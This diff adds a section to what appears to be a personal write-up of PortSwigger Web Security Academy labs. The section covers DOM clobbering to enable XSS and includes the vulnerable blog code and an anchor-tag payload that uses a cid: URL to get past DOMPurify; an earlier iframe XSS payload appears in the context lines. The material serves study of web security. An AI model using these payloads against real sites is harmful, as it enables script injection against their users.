@@ -63,3 +63,18 @@ This URL is saved in the cookie. Then when we call the onload and are redirected
 ```
 <iframe src="https://0a56007f0348ed7b801b8f5b004d002f.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a56007f0348ed7b801b8f5b004d002f.web-security-academy.net';window.x=1;">
 ```
+
+## DOM clobbering to enable XSS (expert)
+From [Portswigger DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering):
+>The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form's actual submit() function.
+
+The Blog page contains a javascript function displayComments which is vulnerable to DOM clobbering:
+```
+      let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
+      let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
+```
+We can inject a DOM clobbering payload as the avatar when we upload a comment to override the globally-scoped window.defaultAvatar variable. In the anchor href we can inject the malicious javascript.
+```
+<a id=defaultAvatar> <a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+```
+The cid: protocol is to bypass DOMPurify
